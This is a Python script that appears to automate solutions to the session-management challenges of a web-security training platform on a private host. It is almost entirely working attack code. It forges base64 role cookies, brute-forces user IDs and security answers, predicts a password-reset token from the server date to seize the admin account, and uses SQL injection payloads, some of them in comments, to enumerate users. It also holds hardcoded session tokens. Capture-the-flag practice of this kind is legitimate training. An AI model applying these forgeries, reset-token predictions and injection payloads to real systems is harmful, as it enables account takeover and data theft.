from html import unescape
from lxml import html
import requests
import base64
import Atom128Encoder
from termcolor import colored

requests.urllib3.disable_warnings()


class SessionManagementExploits:

    @staticmethod
    def request_admin(target_url, post_data, request_headers, request_cookies):
        response = requests.post(url=target_url, data=post_data, headers=request_headers, cookies=request_cookies, verify=False)
        print(colored(response.text, 'cyan', attrs=['bold']))

    @staticmethod
    def fuzz_user_id(target_url, post_data, request_headers, request_cookies):
        response = requests.post(url=target_url, data=post_data, headers=request_headers, cookies=request_cookies, verify=False)
        counter = 1
        user_id = '000000000000000' + str(counter)

        while 'not an Admin' in response.text:
            counter += 1
            print(colored('Failed attempt with id: ' + user_id, 'red', attrs=['bold']))

            if counter < 10:
                user_id = '000000000000000' + str(counter)
            else:
                user_id = '00000000000000' + str(counter)

            post_data['userId'] = user_id
            request_cookies['SubSessionID'] = base64.b64encode(base64.b64encode(user_id.encode())).decode()
            print(colored('Trying new Cookie: ' + request_cookies['SubSessionID'], 'green', attrs=['bold']))
            response = requests.post(url=target_url, data=post_data, headers=request_headers, cookies=request_cookies, verify=False)

        print(colored('UserId found: ' + user_id, 'green', attrs=['bold']))
        print(colored(response.text, 'cyan', attrs=['bold']))

    @staticmethod
    def get_server_time(request_headers, request_cookies):
        target_url = 'https://172.50.1.5:9443/challenges/7aed58f3a00087d56c844ed9474c671f8999680556c127a19ee79fa5d7a132e1SendToken'
        target_data = {
            'subUserName': 'admin'
        }
        response = requests.post(target_url, data=target_data, headers=request_headers, cookies=request_cookies, verify=False)
        server_time = response.headers['date']
        parts = server_time.split(' ')
        print(parts)

        # ToDo: Format: WEEKDAY | MONTH | DAY | TIME | TIMEZONE | YEAR

        weekday = parts[0][:3]
        day = parts[1]
        month = parts[2]
        year = parts[3]
        time = parts[4]
        timezone = parts[5]
        server_time = weekday + ' ' + month + ' ' + day + ' ' + time + ' ' + timezone + ' ' + year

        print(colored(server_time, 'green', attrs=['bold']))
        return server_time

    @staticmethod
    def reset_admin_password(request_headers, request_cookies):
        server_time = SessionManagementExploits.get_server_time(request_headers, request_cookies)

        target_url = 'https://172.50.1.5:9443/challenges/7aed58f3a00087d56c844ed9474c671f8999680556c127a19ee79fa5d7a132e1ChangePass'
        target_data = {
            'userName': 'admin',
            'newPassword': 'administrator',
            'resetPasswordToken': base64.b64encode(server_time.encode()).decode()
        }

        response = requests.post(target_url, data=target_data, headers=request_headers, cookies=request_cookies, verify=False)
        print(colored(response.text, 'cyan', attrs=['bold']))

        if 'success' in response.text:
            print(colored('Successfully changed login information for admin: \n Login: admin\n Password: administrator', 'cyan', attrs=['bold']))
            # ToDo: Send another request to log in with new credentials and print result key

    # Credits to MSommer95 for Source <3
    @staticmethod
    def get_flowers():
        page = requests.get('https://www.enchantedlearning.com/wordlist/flowers.shtml')
        tree = html.fromstring(page.content)
        return tree.xpath('//div[@class="wordlist-item"]/text()')

    @staticmethod
    def get_user_list(request_headers, user_list_cookies):
        user_list_url = 'https://172.50.1.5:9443/challenges/e40333fc2c40b8e0169e433366350f55c77b82878329570efa894838980de5b4UserList'
        user_list_data = {
            'userId': 'd3d9446802a44259755d38e6d163e820',
            'secure': 'true'
        }

        user_string = requests.post(user_list_url, data=user_list_data, headers=request_headers, cookies=user_list_cookies, verify=False)
        print(colored('Found userlist: \n' + user_string.text.replace('<br>', '\n'), 'green', attrs=['bold']))

        user_list = user_string.text.split('<br>')
        user_list.pop()
        return user_list

    @staticmethod
    def fuzz_user_emails(user_list, request_headers, request_cookies):
        form_url = 'https://172.50.1.5:9443/challenges/269d55bc0e0ff635dcaeec8533085e5eae5d25e8646dcd4b05009353c9cf9c80'
        counter = 0
        email_list = []

        while counter < len(user_list):
            post_data = {
                'subName': user_list[counter],
                'subPassword': 'admin'
            }
            response = requests.post(form_url, data=post_data, headers=request_headers, cookies=request_cookies, verify=False)
            counter += 1
            if 'Incorrect password for' in response.text:
                email = (response.text.split('<a>')[1]).split('</a>')[0]
                email = unescape(email)
                print(colored('FOUND EMAIL: ' + email, 'green', attrs=['bold']))
                email_list.append(email)

        return email_list

    @staticmethod
    def fuzz_security_answer(request_headers, request_cookies, user_list_cookies):
        user_list = SessionManagementExploits.get_user_list(request_headers, user_list_cookies)
        user_email_list = SessionManagementExploits.fuzz_user_emails(user_list, headers, cookies)
        flower_list = SessionManagementExploits.get_flowers()

        target_url = 'https://172.50.1.5:9443/challenges/269d55bc0e0ff635dcaeec8533085e5eae5d25e8646dcd4b05009353c9cf9c80SecretQuestion'

        for email in user_email_list:
            for flower in flower_list:
                post_data = {
                    'subEmail': email,
                    'subAnswer': flower
                }
                response = requests.post(target_url, data=post_data, headers=request_headers, cookies=request_cookies, verify=False)

                if 'Incorrect Answer' not in response.text:
                    print(colored('FOUND COMBINATION: ' + email + ' ' + flower, 'green', attrs=['bold']))
                    print(colored(response.text, 'cyan', attrs=['bold']))
                    return
                else:
                    print(colored('Combination: ' + email + ' ' + flower + ' was wrong', 'red', attrs=['bold']))
                    print(colored('Continuing...', 'green', attrs=['bold']))


if __name__ == '__main__':
    # ToDo: Replace JSESSIONID and token Cookies with up to date ones before starting!

    JSESSIONID = 'E3C0A5B1E6147A050B0E65E7E1BB302D'
    token = '-97792836365621464055300175525083819078'
    JSESSIONID3 = 'GRMIgXdfZcUPM4XMOJpeig=='

    # region Session Management 1
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest'
    }

    cookies = {
        'checksum': base64.b64encode(b'userRole=administrator').decode(),
        'JSESSIONID': JSESSIONID,
        'token': token,
        'JSESSIONID3': JSESSIONID3
    }

    data = {
        'adminDetected': 'true',
        'returnPassword': 'true',
        'upgradeUserToAdmin': 'true'
    }

    url = 'https://172.50.1.5:9443/challenges/dfd6bfba1033fa380e378299b6a998c759646bd8aea02511482b8ce5d707f93a'

    print(cookies)

    SessionManagementExploits.request_admin(url, data, headers, cookies)
    input(colored('Press enter to continue with Session Management 3...', 'blue', attrs=['bold']))
    # endregion

    # region Session Management 2
    # ToDo: Just reset Password and look into response with owasp -> new password is in there cleartext
    # endregion

    # region Session Management 3
    cookies = {
        'current': base64.b64encode(base64.b64encode(b'admin')).decode(),
        'JSESSIONID': JSESSIONID,
        'token': token,
        'JSESSIONID3': JSESSIONID3
    }

    data = {
        'newPassword': '12345678',
    }

    url = 'https://172.50.1.5:9443/challenges/b467dbe3cd61babc0ec599fd0c67e359e6fe04e8cdc618d537808cbb693fee8a'

    print(cookies)

    SessionManagementExploits.request_admin(url, data, headers, cookies)
    print(colored('Login data changed for user admin: \n Login: admin\n Password: 12345678', 'cyan', attrs=['bold']))
    #  ToDo: Send another request to log in and print result key
    input(colored('Press enter to continue with Session Management 4...', 'blue', attrs=['bold']))
    # endregion

    # region Session Management 4
    cookies = {
        'checksum': base64.b64encode(b'userRole=administrator').decode(),
        'current': base64.b64encode(base64.b64encode(b'admin')).decode(),
        'SubSessionID': base64.b64encode(base64.b64encode(b'0000000000000001')).decode(),
        'JSESSIONID': JSESSIONID,
        'token': token,
        'JSESSIONID3': JSESSIONID3
    }

    data = {
        'userId': '0000000000000001',
        'useSecurity': 'true'
    }

    url = 'https://172.50.1.5:9443/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6'

    print(cookies)

    SessionManagementExploits.fuzz_user_id(url, data, headers, cookies)
    input(colored('Press enter to continue with Session Management 5...', 'blue', attrs=['bold']))
    # endregion

    # region Session Management 5
    cookies = {
        'JSESSIONID': JSESSIONID,
        'token': token,
        'JSESSIONID3': JSESSIONID3,
        'ac': 'ZG9Ob3RSZXR1cm5BbnN3ZXJz'
    }

    SessionManagementExploits.reset_admin_password(headers, cookies)
    input(colored('Press enter to continue with Session Management 7...', 'blue', attrs=['bold']))
    # endregion

    # region Session Managemenr 6
    # SQLi in Question Field:
    # " UNION Select username from users WHERE username="root";# => root user exists
    # " UNION Select secretanswer from users WHERE username="root";# => root users secret answer is Deerburn Hotel
    # " UNION Select useraddress from users WHERE username="root";# => root users email is elitehacker@shepherd.com
    # login with security question
    # endregion

    # region Session Management 7
    usr_list_cookies = {
        'JSESSIONID': JSESSIONID,
        'token': token,
        'JSESSIONID3': JSESSIONID3,
        'currentPerson': 'Im9yIjEiPSIx'  # Base64 encoded SQLi => "or"1"="1
    }

    cookies = {
        'JSESSIONID': JSESSIONID,
        'token': token,
        'JSESSIONID3': JSESSIONID3,
        'ac': 'ZG9Ob3RSZXR1cm5BbnN3ZXJz'
    }

    SessionManagementExploits.fuzz_security_answer(request_headers=headers, request_cookies=cookies, user_list_cookies=usr_list_cookies)
    input(colored('Press enter to continue with Session Management 8...', 'blue', attrs=['bold']))
    # endregion3

    # region Session Management 8
    cookies = {
        'challengeRole': Atom128Encoder.encode('superuser'),
        'JSESSIONID': JSESSIONID,
        'token': token,
        'JSESSIONID3': JSESSIONID3
    }

    data = {
        'returnUserRole': 'true',
        'returnPassword': 'true',
        'adminDetected': 'true'
    }

    url = 'https://172.50.1.5:9443/challenges/714d8601c303bbef8b5cabab60b1060ac41f0d96f53b6ea54705bb1ea4316334'

    print(cookies)

    SessionManagementExploits.request_admin(url, data, headers, cookies)

    print(colored('Congratulations, you just solved all Session Management Tasks within less than 2 minutes q:^)', 'cyan', attrs=['bold', 'reverse']))
    # endregion


